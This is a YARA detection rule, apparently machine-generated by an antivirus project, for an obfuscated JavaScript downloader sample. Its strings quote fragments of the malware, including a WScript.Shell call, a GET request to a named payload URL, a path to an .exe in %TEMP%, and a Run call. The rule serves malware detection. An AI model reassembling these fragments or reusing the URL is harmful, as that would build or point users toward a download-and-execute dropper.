rule sig_20160401_06525b7ed520bfb3a6de0cb96128b789 {
  meta:
    description = "datamaliciousorder - file 20160401_06525b7ed520bfb3a6de0cb96128b789.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fb936aad7b8139d744f93e6f51082013db52a99a4b761fe0a4410e964d472e08"

  strings:
    $s1  = "var JeOg = function BuQk() {return WScript[OxoNyv](\"WScript\"+\".Shell\");}(), HrBgf = 11;" fullword ascii
    $s2  = "function NeZjb(PvtUv, TgLzd){UraMxj = UraMxj * 1; return PvtUv - TgLzd;};" fullword ascii
    $s3  = "QypMw[WadFpo](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (QypMw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function VwYnb() {return JeOg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9EsSZpSpHJzrBGof.ex\" + \"e\";};" fullword ascii
    $s6  = "function TlPti(){return OjDa + \"\";};" fullword ascii
    $s7  = "function BysTjr() {return ((QlKw == true) && (QlKw == XhoFk)) ? 1 : UraMxj;};" fullword ascii
    $s8  = "function VfsWf(){return 23;};" fullword ascii
    $s9  = "var XhoFk = false;" fullword ascii
    $s10 = "}while (EsbMvq);" fullword ascii
    $s11 = "function ZrnCc(YpxCyo){JeOg[\"R\"+\"un\"](YpxCyo, UraMxj, UraMxj);};" fullword ascii
    $s12 = "XhoFk = true; " fullword ascii
    $s13 = "function RmEmd()" fullword ascii
    $s14 = "return NeZjb(XdkRbf, OymEzy);" fullword ascii
    $s15 = "var QlKw = false;" fullword ascii
    $s16 = "var KlwOoj = new this[\"Date\"]();" fullword ascii
    $s17 = "var XwzMdr = false;" fullword ascii
    $s18 = "QlKw = true; " fullword ascii
    $s19 = "function UwOmp(){return OxoNyv;};" fullword ascii
    $s20 = "function UymZe(KykHm) {var WocBdl = (1, 2, 3, 4, 5, KykHm); return WocBdl;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}